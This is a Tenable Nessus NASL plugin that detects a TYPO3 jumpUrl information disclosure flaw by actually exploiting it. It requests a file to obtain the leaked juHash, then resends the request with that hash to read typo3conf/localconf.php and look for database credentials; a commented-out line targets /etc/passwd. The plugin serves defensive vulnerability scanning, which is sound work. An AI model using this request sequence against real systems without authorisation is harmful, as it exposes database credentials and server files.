#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(35655);
  script_version("$Revision: 1.2 $");

  script_bugtraq_id(33714);
  script_xref(name:"milw0rm", value:"8038");

  script_name(english:"TYPO3 jumpUrl Mechanism Information Disclosure");
  script_summary(english:"Tries to read typo3conf/localconf.php");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains a PHP script that is prone to an\n",
      "information disclosure attack."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The remote host is running TYPO3, an open-source content management\n",
      "system written in PHP.\n",
      "\n",
      "The 'jumpUrl' mechanism in the version of TYPO3 installed on the\n",
      "remote host, which is used to track access, exposes the value of a\n",
      "hash secret used to validate requests.  An unauthenticated remote\n",
      "attacker can leverage this issue to view the contents of arbitrary\n",
      "files on the remote host subject to the privileges of the web server\n",
      "user id.\n"
    )
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://typo3.org/teams/security/security-bulletins/typo3-sa-2009-002/"
  );
  script_set_attribute(
    attribute:"solution", 
    value:string(
      "Either patch the installation as discussed in the project's advisory\n",
      "referenced above or upgrade to TYPO3 version 4.0.12 / 4.1.10 / 4.2.6\n",
      "or later."
    )
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

# file = "/etc/passwd";
# file_pat = "root:.*:0:[01]:";
file = "typo3conf/localconf.php";
file_pat = "\$typo_db_(password|username) *=";


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/cms", "/typo3", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Call up the registration page.
  url = string(
    dir, "/?",
    "jumpurl=", urlencode(str:file), "&",
    "juSecure=1&",
    "type=0&",
    "locationData=", urlencode(str:"3:")
  );

  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(0);

  # Grab the hash.
  juhash = NULL;

  pat = "Calculated juHash, ([a-z0-9]+), did not";
  matches = egrep(pattern:pat, string:res[2]);
  if (matches)
  {
    foreach match (split(matches, keep:FALSE))
    {
      item = eregmatch(pattern:pat, string:match);
      if (!isnull(item))
      {
        juhash = item[1];
        break;
      }
    }
  }
  if (isnull(juhash)) continue;

  # Now read the file.
  url2 = string(url, "&juHash=", juhash);

  res2 = http_send_recv3(method:"GET", item:url2, port:port);
  if (isnull(res2)) exit(0);

  # There's a problem if we see the expected contents.
  if (egrep(pattern:file_pat, string:res2[2]))
  {
    if (report_verbosity > 0)
    {
      report = string(
        "\n",
        "Nessus was able to exploit the issue to retrieve the contents of\n",
        "'", file, "' on the remote host using the following URLs :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n",
        "  ", build_url(port:port, qs:url2), "\n"
      );
      if (report_verbosity > 1)
      {
        report += string(
          "\n",
          "Here are its contents :\n",
          "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
          res2[2], "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
        );
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
